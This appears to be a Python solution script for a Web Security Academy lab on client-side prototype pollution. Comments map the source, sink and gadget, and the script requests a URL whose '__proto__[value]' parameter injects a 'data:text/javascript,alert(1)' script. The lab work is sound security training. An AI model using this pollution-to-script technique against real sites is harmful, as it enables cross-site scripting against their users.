from web_security_academy.core.logger import logger

# Source:   `deparam` function defined in `/resources/js/deparam.js`
# Sink:     `script` element created in `searchLogger` function in `/resources/js/searchLoggerConfigurable.js`
# Gadget:   Object `{configurable: false, writable: false}` in `searchLogger` function


def solve_lab(session):
    path = "/?__proto__[value]=data:text/javascript,alert(1)"
    logger.info(f"Visiting `{path}`...")
    session.get_path(path)
